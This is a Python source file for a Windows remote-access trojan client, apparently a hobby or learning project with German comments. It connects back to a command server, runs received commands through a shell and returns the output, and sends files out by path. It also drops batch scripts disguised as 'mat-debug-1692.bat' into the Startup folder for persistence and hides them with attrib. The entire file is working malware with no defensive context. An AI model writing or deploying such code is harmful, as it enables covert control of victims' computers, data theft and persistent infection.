import socket
from subprocess import check_output, CalledProcessError
from pickle import dumps
from os import getlogin, getenv, startfile, system, chdir, getcwd
from sys import exit
from ctypes import windll
from string import ascii_uppercase


class Socket:

    header = 20
    established = False
    cmd_received = False
    message_in_stock = False

    def connect_to_server(self, ip_address, port):
        try:
            self.active_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.active_socket.connect((ip_address, port))
            self.established = True
            print("Connection established")
        except (ConnectionRefusedError, TimeoutError, socket.error):
            self.established = False
            print("No connection established!")

    def receive_command(self):
        try:
            cmd = self.active_socket.recv(1024)
        except (ConnectionResetError, ConnectionRefusedError, TimeoutError, socket.error):
            self.established = False
            return

        cmd = cmd.decode()

        # Check for batch script

        # Initialize variables
        execute = False
        startup = False
        hide_file = False

        if "-batch" in cmd:

            if "-e" in cmd:
                execute = True
                cmd = cmd.replace("-e ", "")
            if "-s" in cmd:
                startup = True
                cmd = cmd.replace("-s ", "")
            if "-h" in cmd:
                hide_file = True
                cmd = cmd.replace("-h ", "")
            cmd = cmd.replace("-batch ", "")

            drop_and_execute(cmd, execute_file=execute, startup=startup, low_protect=hide_file)
            return

        # Download file

        elif "-download" in cmd:
            path = cmd[10:]
            self.download_file(path)
            return

        # Get and change to logical drives

        elif "-drives" in cmd:
            self.send_msg(self.get_drives())

        elif "-cdrive" in cmd:
            for drive in self.get_drives():
                print(cmd[9:11])
                if drive == cmd[9:11]:
                    try:
                        chdir(drive + "\\")
                    except (PermissionError, FileNotFoundError)as error:
                        self.send_msg(error)
                        break
                    self.send_msg(getcwd())
                    return
            self.send_msg(f"Drive: {cmd[9:11]} not found")
            return

        # Change working directory stuff

        elif "cd.." in cmd[0:4]:
            chdir(self.get_parent_path(getcwd()))

        elif "cd" in cmd[0:2]:
            path = getcwd() + "\\" + cmd[3:]
            try:
                chdir(path)
            except (FileNotFoundError, OSError) as error:
                # self.send_msg(error)
                return
            # self.send_msg(f"Changed directory to {path}")
            return

        # Exit
        elif "-exit" in cmd[0:5]:
            exit()

        # Normal cmd command stuff
        else:
            try:
                output = check_output(cmd, shell=True)
                output = ''.join(chr(i) for i in output)
            except CalledProcessError as error:
                output = error
            self.send_msg(output)
        return

    def send_msg(self, msg, download=False):
        if download:
            msg = bytes(f"{len(msg):{self.header}}", "utf-8") + msg
        else:
            msg = dumps(msg)
            msg = bytes(f"{len(msg):{self.header}}", "utf-8") + msg
        try:
            self.active_socket.send(msg)
            self.established = True
        except(ConnectionResetError, ConnectionAbortedError, OSError):
            self.established = False

    def ping_response(self):
        pass

    def download_file(self, path):
        try:
            file = open(path, "rb")
            file_content = file.read()
            file.close()
            self.send_msg(file_content, download=True)
            return
        except (PermissionError, FileNotFoundError):
            return

    @staticmethod
    def get_parent_path(path):
        switch = False
        new_path = ""
        for char in reversed(path):
            if char == '\\':
                switch = True
            if switch:
                new_path += char
        return new_path[::-1]

    @staticmethod
    def get_drives():
        drives = []
        bit_mask = windll.kernel32.GetLogicalDrives()
        for letter in ascii_uppercase:
            if bit_mask & 1:
                drives.append(letter + ":")
            bit_mask >>= 1
        return drives


def drop_and_execute(script, execute_file=False, startup=False, low_protect=False):
    if not script:
        return
    # Format script
    script = script.replace("/n", "\n")

    # Default file name
    file_name = "mat-debug-1692.bat"

    # Create Path to drop and execute
    if startup:
        path = "C:\\Users\\" + getlogin() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + file_name
    else:
        path = getenv("temp") + "\\" + file_name

    # Drop file
    try:
        with open(path, "w+")as f:
            f.write(script)
    except PermissionError:
        return

    # Execute File
    if execute_file:
        startfile(path)

    # Hide File by calling Windows command
    if low_protect:
        chdir("C:\\Users\\" + getlogin() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\")
        system("attrib +h +r " + file_name)


connection = Socket()
while True:
    if not connection.established:
        connection.connect_to_server(socket.gethostname(), 20000)
    while connection.established:
        connection.receive_command()


# Change hard drives
# Ping Methode dass nach jedem command irgendein Output kommt


